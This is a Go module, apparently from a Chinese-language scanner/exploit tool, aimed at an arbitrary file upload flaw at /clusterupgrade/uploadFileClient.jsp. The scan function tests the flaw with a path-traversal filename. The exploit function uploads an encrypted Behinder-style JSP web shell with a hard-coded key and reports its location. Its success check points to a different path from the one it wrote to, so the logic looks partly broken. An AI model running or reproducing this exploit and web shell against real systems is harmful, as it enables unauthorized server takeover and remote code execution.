package vulners

import (
	"bytes"
	"github.com/fatih/color"
	"github.com/imroc/req/v3"
	"io"
	"strings"
)

type Wc09 struct {
}

func (s *Wc09) Scan(targetUrl string) {
	vulnerable, err := Wc09scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wc09] 存在UploadFileClient 任意文件上传")
	} else {
		color.White("[Wc09] 不存在UploadFileClient 任意文件上传")
	}
}

func (*Wc09) Exploit(targetUrl string) {
	runResult, err := Wc09runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Wc09scancore(targetUrl string) (bool, error) {
	url := "/clusterupgrade/uploadFileClient.jsp"
	data := []byte("helloword")
	resp1, err := baseClient.NewRequest().SetFileUpload(req.FileUpload{
		ParamName: "upload",
		FileName:  "../../clusterupgrade/a7.txt",
		GetFileContent: func() (io.ReadCloser, error) {
			return io.NopCloser(bytes.NewBuffer(data)), nil
		},
		FileSize:    int64(len(data)),
		ContentType: "image/jpeg",
	}).Post(targetUrl + url)
	if err != nil {
		return false, err
	}
	url1 := "/clusterupgrade/a7.txt"
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url1)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	resContent1 := resp1.String()
	if strings.Contains(resContent, "helloword") {
		return true, nil
	} else if strings.Contains(resContent1, "安全") {
		resContent1 = strings.Replace(resContent1, "\n", "", -1)
		color.Green(resContent1 + "\n")
		return false, nil
	} else {
		return false, nil
	}
}

func Wc09runcore(targetUrl string) (string, error) {
	url := "/clusterupgrade/uploadFileClient.jsp"
	data := []byte("hello<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>")
	resp1, err := baseClient.NewRequest().SetFileUpload(req.FileUpload{
		ParamName: "upload",
		FileName:  "../../clusterupgrade/a7.txt",
		GetFileContent: func() (io.ReadCloser, error) {
			return io.NopCloser(bytes.NewBuffer(data)), nil
		},
		FileSize:    int64(len(data)),
		ContentType: "image/jpeg",
	}).Post(targetUrl + url)
	if err != nil {
		return "", err
	}
	url1 := "/clusterupgrade/1ndex.jsp"
	resp, err := baseClient.NewRequest().Get(targetUrl + url1)
	if err != nil {
		return "", err
	}
	resContent := resp.String()
	resContent1 := resp1.String()
	if strings.Contains(resContent, "hello") {
		return "存在UploadFileClient 任意文件上传,冰蝎:" + targetUrl + "/clusterupgrade/1ndex.jsp 默认密码", nil
	} else if strings.Contains(resContent1, "安全") {
		resContent1 = strings.Replace(resContent1, "\n", "", -1)
		color.Green(resContent1 + "\n")
		return "", nil
	} else {
		return "", nil
	}
}
